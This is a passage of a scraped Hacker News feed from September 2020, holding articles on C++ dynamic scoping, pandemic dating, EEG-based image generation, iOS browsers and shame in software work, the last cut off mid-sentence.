<p>You can think of a dynamically-scoped global variable as shadowable
global binding. By creating a new binding for the variable, we shadow
the old binding, and all references in child functions will now refer
to the new binding, although they have not received the value via an
argument transfer. Ergo, dynamically-scoped variables are shadowable
side-channels that can influence the behavior of a function.</p>
<p>For example, in Common Lisp, the variable <code>*standard-output*</code> is
dynamically scoped and functions <code>(print)</code> simply send there
characters to that variable. As it is dynamically scoped, we can just
redirect all output to a file by creating a new binding for
<code>*standard-output*</code>.</p>
<div><pre><span></span><span>(</span><span>with-open-file</span> <span>(</span><span>*standard-output*</span> <span>"somefile.dat"</span> <span>:direction</span> <span>:output</span>
                                   <span>:if-exists</span> <span>:supersede</span><span>)</span>
   <span>(</span><span>print</span> <span>"this goes into file"</span><span>))</span>
</pre></div>


<p>Wouldn't it be neat to do the same in, let's say, C++? Luckily, with
templates, the RAII pattern, and some template magic, we can write
code like this:</p>
<div><pre><span></span><span>DynamicScope</span><span>&lt;</span><span>int</span><span>&gt;</span> <span>G</span><span>(</span><span>0</span><span>);</span>

<span>void</span> <span>bar</span><span>()</span> <span>{</span>
    <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"bar "</span> <span>&lt;&lt;</span> <span>*</span><span>G</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>
<span>}</span>

<span>void</span> <span>foo</span><span>()</span> <span>{</span>
    <span>DynamicScope</span><span>&lt;</span><span>int</span><span>&gt;::</span><span>BindInstance</span> <span>_</span><span>(</span><span>G</span><span>,</span> <span>3</span><span>);</span>
    <span>bar</span><span>();</span>
<span>}</span>
<span>int</span> <span>main</span><span>()</span> <span>{</span>
    <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"main1 "</span> <span>&lt;&lt;</span> <span>*</span><span>G</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>
    <span>foo</span><span>();</span>
    <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"main2 "</span> <span>&lt;&lt;</span> <span>*</span><span>G</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>

<span>}</span>
</pre></div>


<p>and end up with the output:</p>



<p>The source for the <code>DynamicScope&lt;T&gt;</code> can be found here:    <a href="https://blog.dokucode.de/posts/2020-07-10-Dynamic-Scoping-in-CPP/dynamic_scope.cc">dynamic_scope.cc</a>
</p>
<h2 id="update-23092020-multi-threaded-programs">[UPDATE 23.09.2020] Multi-Threaded Programs</h2>
<p>After some discussion on
<a href="https://news.ycombinator.com/item?id=24544716">HackerNews</a> (which I
highly recommend to read), I was made aware that the previous
implementation has a problem with multi-threaded programs. As all
threads share the same global objects as a root to their dynamic-scope
value stack, bindings in one thread had an influence on the bindings
in another thread. Of coure, this would be a broken version of dynamic
scoping.</p>
<p>The problem can be circumvented by making the global variable thread local:</p>
<div><pre><span></span><span>thread_local</span> <span>DynamicScope</span><span>&lt;</span><span>int</span><span>&gt;</span> <span>G</span><span>(</span><span>0</span><span>);</span>
</pre></div>


<p>With this, every thread has its own version of the G object, which
internally is the head of a linked list of the shadowed values.
However, someone could forget the add the required thread_local attribute.</p>
<p>Unluckily, checking whether the storage class of a given variable is
thread_local is not that trivial. However, I came up with a rather
low-cost sanity check that ensures that a variable must be declared
<code>thread_local</code>. The updated version of <code>DynamicScope&lt;T&gt;</code>, as well as
some benchmarking code, can be found here:    <a href="https://blog.dokucode.de/posts/2020-07-10-Dynamic-Scoping-in-CPP/thread_dynamic_scope.cc">thread_dynamic_scope.cc</a>
</p>
      </div></div>]]>
            </description>
            <link>https://blog.dokucode.de/posts/2020-07-10-Dynamic-Scoping-in-CPP.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24544716</guid>
            <pubDate>Mon, 21 Sep 2020 15:45:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dating is better than ever with social distancing]]>
            </title>
            <description>
<![CDATA[
Score 23 | Comments 13 (<a href="https://news.ycombinator.com/item?id=24544686">thread link</a>) | @colinprince
<br/>
September 21, 2020 | https://www.cbc.ca/radio/thedebaters/dating-is-actually-better-than-ever-with-social-distancing-1.5629793 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/radio/thedebaters/dating-is-actually-better-than-ever-with-social-distancing-1.5629793">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>DeAnne Smith and Arthur Simeon have each other’s number when they discuss if social distancing improves dating.</p><div><figure><div><p><img alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5629807.1593220440!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/social-distance-dating.jpg"></p></div><figcaption> <!-- -->(CCO/Pexels)</figcaption></figure><p><span></span><span>Listen</span><span>17:15</span></p><p><span><p><a href="http://www.deannesmith.com/" target="_blank">DeAnne Smith</a> and <a href="https://www.arthursimeon.com/" target="_blank">Arthur Simeon</a> have each other's number when they discuss if social distancing improves dating.</p>  <p>DeAnne Smith makes it clear why dating in isolation is their fascination.</p>    <blockquote><span><span><svg version="1.1" focusable="false" x="0px" y="0px" width="30px" height="25px" viewBox="0 0 52.157 39.117" enable-background="new 0 0 52.157 39.117" space="preserve"><g><g><path fill="000000" d="M22.692,10.113c-5.199,1.4-8.398,4.4-8.398,8.801c0,2.4,2,3,3.6,4.199c2.2,1.602,3.4,3.4,3.4,6.602   c0,3.799-3.4,6.799-7.4,6.799c-4.6,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z M45.692,10.113   c-5.199,1.4-8.399,4.4-8.399,8.801c0,2.4,2,3,3.601,4.199c2.2,1.602,3.399,3.4,3.399,6.602c0,3.799-3.399,6.799-7.399,6.799   c-4.601,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z"></path></g></g><g display="none"><g display="inline"> <path fill="000000" d="M6.648,29.759c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.399-3.4-3.399-6.6   c0-3.801,3.399-6.801,7.399-6.801c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z M29.648,29.759   c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.401-3.4-3.401-6.6c0-3.801,3.401-6.801,7.401-6.801   c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z"></path></g></g></svg>Being in a new relationship during a global pandemic puts things in perspective. We're not evaluating each other on whether or not we want to grow old together&nbsp;but on whether or not we want to grow vegetables together.<svg focusable="false" x="0px" y="0px" width="23px" height="22px" viewBox="0 0 52.157 39.117" enable-background="new 0 0 52.157 39.117" space="preserve"><g display="none"><g display="inline"><path fill="000000" d="M22.692,10.113c-5.199,1.4-8.398,4.4-8.398,8.801c0,2.4,2,3,3.6,4.199c2.2,1.602,3.4,3.4,3.4,6.602   c0,3.799-3.4,6.799-7.4,6.799c-4.6,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z M45.692,10.113   c-5.199,1.4-8.399,4.4-8.399,8.801c0,2.4,2,3,3.601,4.199c2.2,1.602,3.399,3.4,3.399,6.602c0,3.799-3.399,6.799-7.399,6.799   c-4.601,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z"></path></g></g><g><g><path fill="000000" d="M6.648,29.759c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.399-3.4-3.399-6.6   c0-3.801,3.399-6.801,7.399-6.801c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z M29.648,29.759   c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.401-3.4-3.401-6.6c0-3.801,3.401-6.801,7.401-6.801   c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z"></path></g></g></svg></span><cite>- DeAnne Smith</cite></span></blockquote>    <p>But Arthur Simeon says he's not willing to go the distance with social distance dating.</p>    <blockquote><span><span><svg version="1.1" focusable="false" x="0px" y="0px" width="30px" height="25px" viewBox="0 0 52.157 39.117" enable-background="new 0 0 52.157 39.117" space="preserve"><g><g><path fill="000000" d="M22.692,10.113c-5.199,1.4-8.398,4.4-8.398,8.801c0,2.4,2,3,3.6,4.199c2.2,1.602,3.4,3.4,3.4,6.602   c0,3.799-3.4,6.799-7.4,6.799c-4.6,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z M45.692,10.113   c-5.199,1.4-8.399,4.4-8.399,8.801c0,2.4,2,3,3.601,4.199c2.2,1.602,3.399,3.4,3.399,6.602c0,3.799-3.399,6.799-7.399,6.799   c-4.601,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z"></path></g></g><g display="none"><g display="inline"> <path fill="000000" d="M6.648,29.759c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.399-3.4-3.399-6.6   c0-3.801,3.399-6.801,7.399-6.801c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z M29.648,29.759   c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.401-3.4-3.401-6.6c0-3.801,3.401-6.801,7.401-6.801   c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z"></path></g></g></svg>Every first date is happening via video call so while you don't have to be bothered by showering or wearing anything below the waist, you still have to find the most 'interesting' corner of your house to make the call.<svg focusable="false" x="0px" y="0px" width="23px" height="22px" viewBox="0 0 52.157 39.117" enable-background="new 0 0 52.157 39.117" space="preserve"><g display="none"><g display="inline"><path fill="000000" d="M22.692,10.113c-5.199,1.4-8.398,4.4-8.398,8.801c0,2.4,2,3,3.6,4.199c2.2,1.602,3.4,3.4,3.4,6.602   c0,3.799-3.4,6.799-7.4,6.799c-4.6,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z M45.692,10.113   c-5.199,1.4-8.399,4.4-8.399,8.801c0,2.4,2,3,3.601,4.199c2.2,1.602,3.399,3.4,3.399,6.602c0,3.799-3.399,6.799-7.399,6.799   c-4.601,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z"></path></g></g><g><g><path fill="000000" d="M6.648,29.759c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.399-3.4-3.399-6.6   c0-3.801,3.399-6.801,7.399-6.801c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z M29.648,29.759   c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.401-3.4-3.401-6.6c0-3.801,3.401-6.801,7.401-6.801   c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z"></path></g></g></svg></span><cite>- Arthur Simeon</cite></span></blockquote>    <p>For a debate that will make you feel like a lovesick quaran-teen-ager, click play now!</p>  </span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/radio/thedebaters/dating-is-actually-better-than-ever-with-social-distancing-1.5629793</link>
            <guid isPermaLink="false">hacker-news-small-sites-24544686</guid>
            <pubDate>Mon, 21 Sep 2020 15:42:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A com­puter pre­dicts your thoughts, creating im­ages based on them]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24544678">thread link</a>) | @headalgorithm
<br/>
September 21, 2020 | https://www.helsinki.fi/en/news/data-science-news/a-computer-predicts-your-thoughts-creating-images-based-on-them | <a href="https://web.archive.org/web/*/https://www.helsinki.fi/en/news/data-science-news/a-computer-predicts-your-thoughts-creating-images-based-on-them">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
                          By monitoring brain function, computers can be made to imagine what a person is thinking of and present the results as images. The technique can be utilised in psychology and cognitive neuroscience, as well as supporting human creativity.               </p><div>
                          <div><p>Researchers at the University of Helsinki have developed a technique in which a computer models visual perception by monitoring human brain signals. In a way, it is as if the computer tries to imagine what a human is thinking about. As a result of this imagining, the computer is able to produce entirely new information, such as fictional images that were never before seen.</p>
<p>The technique is based on a novel brain-computer interface. Previously, similar brain-computer interfaces have been able to perform one-way communication from brain to computer, such as spell individual letters or move a cursor.</p>
<p>As far as is known, the new study is the first where both the computerâ€™s presentation of the information and brain signals were modelled simultaneously using artificial intelligence methods. Images that matched the visual characteristics that participants were focusing on were generated through interaction between human brain responses and a generative neural network.</p>
<p>The study was published in the <em>Scientific Reports</em> journal in September. Scientific Reports is an online multidisciplinary, open-access journal from the publishers of <em>Nature</em>.</p>
<h2><strong>Neuroadaptive generative modelling </strong></h2>
<p>The researchers call this method neuroadaptive generative modelling. A total of 31 volunteers participated in a study that evaluated the effectiveness of the technique. Participants were shown hundreds of AI-generated images of diverse-looking people while their EEG was recorded.</p>
<p>The subjects were asked to concentrate on certain features, such as faces that looked old or were smiling. While looking at a rapidly presented series of face images, the EEGs of the subjects were fed to a neural network, which inferred whether any image was detected by the brain as matching what the subjects were looking for.</p>
<p>Based on this information, the neural network adapted its estimation as to what kind of faces people were thinking of. Finally, the images generated by the computer were evaluated by the participants and they nearly perfectly matched with the features the participants were thinking of. The accuracy of the experiment was 83 per cent.</p>
<p>â€œThe technique combines natural human responses with the computer's ability to create new information. In the experiment, the participants were only asked to look at the computer-generated images. Â&nbsp;The computer, in turn, modeled the images displayed and the human reaction toward the images by using human brain responses. From this, the computer can create an entirely new image that matches the user's intention,â€� says <a href="https://www.helsinki.fi/en/people/people-finder/tuukka-ruotsalo-9089453"><strong>Tuukka Ruotsalo</strong></a>, Academy of Finland Research Fellow at the University of Helsinki, Finland and Associate Professor at the University of Copenhagen, Denmark.</p>
<h2><strong>Unconscious attitudes may be exposed</strong></h2>
<p>Generating images of the human face is only one example of the techniqueâ€™s potential uses. One practical benefit of the study may be that computers can augment human creativity.</p>
<p>â€œIf you want to draw or illustrate something but are unable to do so, the computer may help you to achieve your goal. It could just observe the focus of attention and predict what you would like to create,â€� Ruotsalo says.</p>
<p>However, the researchers believe that the technique may be used to gain understanding of perception and the underlying processes in our mind.</p>
<p>â€œThe technique does not recognise thoughts but rather responds to the associations we have with mental categories. Thus, while we are not able to find out the identity of a specific â€˜old personâ€™ a participant was thinking of, we may gain an understanding of what they associate with old age. We, therefore, believe it may provide a new way of gaining insight into social, cognitive and emotional processes,â€� says Senior Researcher <a href="https://www.helsinki.fi/en/people/people-finder/michiel-spape-9362108"><strong>Michiel SpapÃ©</strong></a>.</p>
<p>According to SpapÃ©, this is also interesting from a psychological perspective.</p>
<p>â€œOne person's idea of an elderly person may be very different from another's. We are currently uncovering whether our technique might expose unconscious associations, for example by looking if the computer always renders old people as, say, smiling men.â€�</p>
<div>
<div><!-- scald=179681:large_content_image -->
  <div>


  <p>
                          <iframe frameborder="0" allowfullscreen="" title="Youtube embed" data-src="https://www.youtube.com/embed/HK_MH4w9WvU?width=&amp;height=&amp;theme=dark&amp;autoplay=0&amp;vq=hd720&amp;rel=0&amp;showinfo=1&amp;modestbranding=0&amp;iv_load_policy=1&amp;controls=1&amp;autohide=2&amp;wmode=opaque"></iframe>
              </p>
</div><!-- END scald=179681 --></div>

</div>
<p><strong>Publication: </strong><br>
Kangassalo, Lauri, SpapÃ©, Michiel, and Ruotsalo, Tuukka. Neuroadaptive modelling for generating images matching perceptual categories.Â&nbsp;<em>Scientific Reports</em>Â&nbsp;<strong>10,Â&nbsp;</strong>14719 (2020).Â&nbsp;<a href="https://doi.org/10.1038/s41598-020-71287-1">https://doi.org/10.1038/s41598-020-71287-1</a></p>
<p><strong>Further information:</strong><br>
Tuukka Ruotsalo<br>
Department of Computer Science, University of Helsinki andÂ&nbsp;University of Copenhagen<br><a href="mailto:tuukka.ruotsalo@helsinki.fi">tuukka.ruotsalo@helsinki.fi</a><br>
+358 50 566 1400</p>
<p><strong>Read more:</strong><br><a href="https://www.cs.helsinki.fi/group/intercom/">Cognitive computing research group</a><br><a href="https://www.helsinki.fi/en/news/data-science-news/brainsourcing-automatically-identifies-human-preferences">BrainÂ­sourcing autoÂ­matÂ­icÂ­ally idenÂ­tiÂ­fies huÂ­man prefÂ­erÂ­enÂ­ces</a><br><a href="https://www.helsinki.fi/en/news/data-science-news/the-brain-uses-minimum-effort-to-look-for-key-information-in-text">The brain uses minÂ­imum efÂ­fort to look for key inÂ­forÂ­maÂ­tion in text</a></p>
</div>              </div></div>]]>
            </description>
            <link>https://www.helsinki.fi/en/news/data-science-news/a-computer-predicts-your-thoughts-creating-images-based-on-them</link>
            <guid isPermaLink="false">hacker-news-small-sites-24544678</guid>
            <pubDate>Mon, 21 Sep 2020 15:41:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Comparative Review of iOS Browsers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24544633">thread link</a>) | @ymolodtsov
<br/>
September 21, 2020 | https://molodtsov.me/2020/09/a-comparative-review-of-ios-browsers/ | <a href="https://web.archive.org/web/*/https://molodtsov.me/2020/09/a-comparative-review-of-ios-browsers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="post-body"><p><img src="https://molodtsov.me/images/post.png" alt=""></p><p>iOS 14 has finally <a href="https://www.theverge.com/21444995/ios-14-default-browsers-chrome-edge-firefox-duckduckgo-safari">added</a> an option to set third-party browsers and email clients as the default. Unfortunately, iOS still imposes certain limitations on all of them. If you also count these browsers’ own shortfalls, for the best possible experience you might want to stay on Safari.</p><p>In the past two years I switched from Safari to Chrome to Firefox to Edge and then back to Chrome. I also used their respected mobile versions so I could sync my data with the desktop (or at least some data).</p><p>If you use <strong>any</strong> third-party browser you will lose a few features.</p><h2 id="content-blockers">Content Blockers</h2><p>Content Blockers are a recent Apple solution for ad blocking. It’s supposed to be the more private since these extensions don’t get access to your browser and its history. Instead, they provide a list of patterns that Safari would block on its own. The one I use is called <a href="https://giorgiocalderolla.com/wipr.html">WIRP</a>. Content blockers don’t work in third-party browsers by design. If you want to have an ad-free experience with third-party browsers you have to use something like <a href="https://adguard.com/en/welcome.html">AdGuard</a>. It works by launching an on-device VPN that blocks the ads at the DNS level.</p><h2 id="password-autofill">Password Autofill</h2><p>When Safari detects a login form it automatically suggests to fill it with the account it finds relevant. Sometimes it makes mistakes, especially if you have several accounts on a single website (Hey Google) but it’s definitely nice to have. This feature doesn’t work in third-party browsers – presumably so other apps couldn’t mask as your browser and get any kind of access to your passwords. You have to manually tap on the password field and then you’ll see a “<em>Passwords</em>” button on top of your keyboard.</p><p>The problem? A lot of websites expect you to log in via multiple options, include SSO providers (Single Sign-On). So they only show you the email field first in case you have one of these accounts that would be accessible without its own password. So in third-party browsers you have to manually type your login/email and then tap the password field when it appears and tap “Passwords”. For a person used to password managers like 1Password, it’s not a great experience.</p><h2 id="bugs">Bugs</h2><p>Chrome, Edge, Brave, Firefox – all of them use mobile WebKit on iOS. But for some reason, they still occasionally show bugs and visual glitches that aren’t present in Safari. The two I see most often: horizontal jiggle while scrolling and sudden left-right margins added if I switch back-and-forth from the browser.</p><hr><p>Now let’s look at these browsers themselves. Some people say that third-party browsers on iOS are just Safari in disguise. They’re mostly right, but users care more about the browser features and its ability to sync their data, not the underlying engine.</p><p><img src="https://molodtsov.me/images/chrome.png" alt=""></p><p>Chrome is the most popular browser on the planet, it has about <a href="https://gs.statcounter.com/browser-market-share">65%</a> market share. It’s natural a lot of people would choose Chrome on their iPhones and iPads as well.</p><p>With Chrome it often feels that its iOS version is developed by a completely different team that doesn’t speak with their big brother much.</p><p>Chrome for desktop has a reader mode. Chrome for Android has a reader mode. Chrome for iOS doesn’t. On a smallish mobile screen, it’s often the only way to properly read articles on the modern web. And Safari Reader Mode is just fantastic, so it’s always sad to live without it.</p><p>Chrome for iOS does have a feature called reading list that allows saving articles to read later. Chrome for desktop doesn’t have it, so this list doesn’t sync with other devices.</p><p>I definitely prefer the tab switching menu on Chrome. The one in Safari might look nice but isn’t great when you have a lot of tabs opened. The problem is, this interface reeks Android – and not with its best parts. For instance, it has no gestures to close a tab. The only way is to tap a small [x]. Every time.</p><p>Chrome has a very basic context menu for links. When you force press a link in Safari, you get a preview and context options. In Chrome force pressing a link doesn’t give you anything, even on iPhone XS that supports it. You have to make a long press which gives you just a basic context menu. At the same time, you can force press the menubar icons on the bottom to get more options. I don’t understand why they would have such a discrepancy. And as you will see later, <em>all</em> other browsers at least show a preview.</p><p>Chrome does sync all key data: passwords, history, open tabs – with the desktop version and it’ll probably be enough for most people. Recently it <a href="https://www.macrumors.com/2020/07/30/chrome-ios-password-manager/">added</a> an option to act as a password manager across iOS. If Chrome is your primary browser on desktop and you keep all your passwords there this feature allows you to access them across iOS and all other apps and not just websites.</p><p><img src="https://molodtsov.me/images/edge.png" alt=""></p><p>Edge is a Microsoft-flavored Chrome. The first time I tried it, it felt a bit weird but with time I realized it’s a better Chrome with less reliance on Google and its shady practices.</p><p>Edge for iOS was released in 2017. It didn’t have tab syncing. Then they replaced it because the desktop version went Chromium in 2019. Microsoft <a href="https://www.theverge.com/2020/1/15/21066767/microsoft-edge-chromium-new-browser-windows-mac-download-os">promised</a> to add syncing for tabs and history between Edge iOS and MacOS later. It still hasn’t delivered that (the latest date they talked about was the “summer”).</p><p>Mobile Edge is pretty much consistent with iOS, its features and design. The tab management view is great and allows you to close tabs with a swipe. Force clicking a link shows a preview and a context menu, just like Safari. Edge has a reader mode across all platforms and it’s pretty good.</p><p>If Edge had syncing it’d be a great option. But we still have to wait for this. Unfortunately, this is a consistent theme in Microsoft development efforts where they don’t add promised features or fix small bugs in years – see natural language support in To Do or “Read More” view you get on any newsletter in mobile Outlook.</p><p><img src="https://molodtsov.me/images/firefox.png" alt=""></p><p>Firefox, a rebel alliance against the Chrome empire. And if you’re one of the few people using it, you might find it great on iOS.</p><ul><li>Firefox syncs all data with the desktop version.</li><li>Firefox has a good tab switching window.</li><li>Firefox has a nice reader mode on all platforms, including iOS.</li><li>Force clicking a link shows you a Safari-like preview and a context menu.</li><li>Firefox on iOS has a unique dark mode that forces all websites into black background, something that isn’t possible in any other browser.</li><li>Firefox has a dedicated password manager called Lockwise. If you aren’t using a third-party password manager, installing Lockwise allows you to quickly access the passwords you save in Firefox across iOS and all other apps – that’s a great feature that Firefox had long before Chrome.</li><li>Firefox doesn’t support Apple Handoff in both directions, unlike Chromium-related browsers.</li></ul><p>If you like Firefox on the desktop, it’s a great option for iOS. But all recent layoffs, deprecation of products, and lack of development on the PWA side don’t instill a lot of hope into the project.</p><p><img src="https://molodtsov.me/images/brave.png" alt="Brave"></p><p>Brave is another Chromium-based browser. I don’t have as much experience with it as with other apps but tried to immerse myself in it. Brave recently added full-scale sync for Android and desktop and promises to bring iOS on par with it. So far it doesn’t sync history and open tabs.</p><p>Generally Brave looks similar to Edge in terms of features:</p><ul><li>Brave has a good tab switching window.</li><li>Brave has a nice reader mode on iOS.</li><li>Force clicking a link shows you a Safari-like preview and a context menu.</li></ul><p>Brave has a couple of unique things:</p><ul><li>Brave shows tabs on top just like browsers on desktop or iPad. These targets are rather small but some people might like it.</li><li>Brave has its own ad-blocking which is very helpful in the absence of content blockers.</li></ul><hr><p>So far I’m not able to switch the default settings because none of the third-party browsers feel like a first-class citizen. And when you add their own shortcomings, whether that’s an absence of sync or issues with their UI, Safari still seems like the best choice for regular web browsing.</p></section></div>]]>
            </description>
            <link>https://molodtsov.me/2020/09/a-comparative-review-of-ios-browsers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24544633</guid>
            <pubDate>Mon, 21 Sep 2020 15:37:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tesla Patents Metal-Air Battery Pack, May Be Strong Clue for Battery Day 2020]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24544532">thread link</a>) | @CarCooler
<br/>
September 21, 2020 | https://www.evunite.com/blog/tesla-patent-metal-air-battery-granted-prior-to-2020-battery-day/ | <a href="https://web.archive.org/web/*/https://www.evunite.com/blog/tesla-patent-metal-air-battery-granted-prior-to-2020-battery-day/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.evunite.com/blog/tesla-patent-metal-air-battery-granted-prior-to-2020-battery-day/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24544532</guid>
            <pubDate>Mon, 21 Sep 2020 15:27:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Shame and Software]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24544445">thread link</a>) | @coloneltcb
<br/>
September 21, 2020 | https://truss.works/blog/shame-and-software | <a href="https://web.archive.org/web/*/https://truss.works/blog/shame-and-software">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-layout-label="Post Body" data-type="item" data-updated-on="1600369047063" id="item-5f63afb8b235d7261d2368f5"><div><div><div data-block-type="2" id="block-4d91292cedc6efecefbe"><div><p>My cell phone is chirping, alerts are beeping, my Slack channels are aflame with bright red dots. Alone in my home office, I can feel my stomach sink and flood with acid and my face bloom hot. I realize I pushed code to production just a few hours ago. Is this incident my fault? As I begin to click into the various alert messages and take stock of what is happening, I can already hear myself inside my head:</p><p>“I failed to test my changes in our staging environment.”</p><p>“We should have better automated testing. We should have hired full-time QA people!”</p><p>“The people who wrote the code I was fixing should have done a better job in the first place.”</p><p>“I didn’t want to work on this stupid ticket anyway.”</p><p>“The users who are reporting this problem should just go away and do something else. Users are dumb.”</p><p>“I should find a new career! I hate this.”</p><p>After a few minutes of reading monitors and error logs and some brief investigations of our production systems, I see the problematic alerts resolve themselves. The chirping stops. The red dots disappear. There was a network problem far upstream from our applications that caused a brief interruption to all systems.</p><p>It wasn’t my fault. And yet I underwent a complex physiological and emotional experience, and constructed a complete, defensive, negative narrative in my own mind, all in the span of a few minutes, without ever speaking to or even seeing another human being.</p><p>What was going on? Shame.</p><h2>Emotional literacy at Truss</h2><p>Truss emphasizes <a href="https://en.wikipedia.org/wiki/Emotional_intelligence"><span>emotional intelligence</span></a> in our hiring practice. We look for people capable of and committed to <a href="https://truss.works/values"><span>practicing self- and situational awareness</span></a>. We also ask ourselves to act without fear. Often, these values mean we need to gently interrogate ourselves and reflect on the complicated emotional reactions we have in our work, in meetings, conversations, coding, design and research, planning, and yes, incident response. It’s not therapy (though that sometimes helps, outside the work context). It’s the capacity for using language to reflect on and speak about our human experiences. This is not simply an individual exercise in self-actualization. It’s good business. We interact with other humans – our clients, our partners, our colleagues – all day long, and playing well with others makes for good partnerships and successful projects.</p><p>Make no mistake, it’s work. Emotional labor is real labor, even if it is often not visible in the same way as lines of code, wireframes, research reports, or sales proposals. Reading code requires a certain literacy. So does reading situations. That’s why we spend time on things like emotional literacy.</p><p>One of the emotional dynamics I observe frequently in my work life is shame, both in myself and others. <a href="https://en.wikipedia.org/wiki/Shame"><span>Shame</span></a> is a primary human <a href="https://en.wikipedia.org/wiki/Affect_theory"><span>affect</span></a> that can result in complicated emotions and behaviors. I have found that a recognition and effective response to shame, in myself and others, has been crucial in my professional life. This post briefly defines shame, describes some emotional and organizational patterns related to shame, and discusses a few practical approaches to managing shame, both as an individual and an organization.</p><h2>What is shame?</h2><p>Shame is the experience of feeling seen in a painful and diminished sense, of being evaluated and identified as lacking in some respect. Shame is biological. It can be intensely, internally uncomfortable, because the physical effect of shame is to amplify our awareness of ourselves and our environment. Shame exists before thinking or language. We might feel small, stuck, bound, captured, frozen, powerless, or hijacked. We are speechless or we stammer. Some people fidget. Some people get intensely still, as if by not moving they will no longer be seen.</p><p>Shame is an experience of exposure and self-consciousness. When we feel shame, we often feel it first in our face. Think of all the ways the word “face” reflects shame-related situations. We face the consequences; we can (or cannot) face up to a task; we put on a brave face, or we have egg on our face, or we can’t show our faces around here. We are self-effacing (literally, removing our faces), or we are trying to save face. In <a href="https://en.wikipedia.org/wiki/The_Scarlet_Letter"><span><em>The Scarlet Letter</em></span></a>, Hawthorne’s famous story about shame, the townspeople punish the heroine most profoundly by preventing her from hiding her face.</p><p>Of course, being seen is, by itself, not shameful. On the contrary, being seen by another person is often positive. The shortest verbal affirmation on social media these days is something like “I see you.” Being recognized and acknowledged can produce the opposite of shame, particularly if the other person likes us or is pleased to see us. The key piece of the shame experience is the part where we are found lacking or inadequate. Shame is the feeling that fills the gap between the <a href="https://www.simplypsychology.org/self-concept.html#ideal"><span>ideal self and real self</span></a>. Shame is the experience of not measuring up. The wider the gap, the bigger the potential shame experience.</p><p>Shame is, all by itself, normal. What happens for many of us is that we, and the people around us, lack skills for recovering from the feeling, and so shame can become toxic and internalized, so that the act of being seen is something we carry around with us all the time, like a self-recharging flashlight. Every time we turn it on, it gets stronger for the next time. We can also develop strong memories of prior shame experiences, which can begin to shape our behavior as we try to avoid repeating the experience. The fear of shame can become a powerful (and often hidden) motivation and impulse behind our words and actions.</p><p>A feeling of abandonment often accompanies shame, the feeling of another person turning their own face away from us in judgement. Shame is always relational, but significantly, we can feel shame without another person present. This is particularly true when we have internalized the shame pattern to the point where we can act out the entire drama of being seen and casting judgement, all by ourselves. We split our inner self into the one who shames and the one who is shamed. Many of us learn that pattern as children, and many of us carry forward an internalized and magnified sense of shame because we have learned to constantly observe and evaluate ourselves. We sometimes refer to this pattern as the little voice in our heads that judges 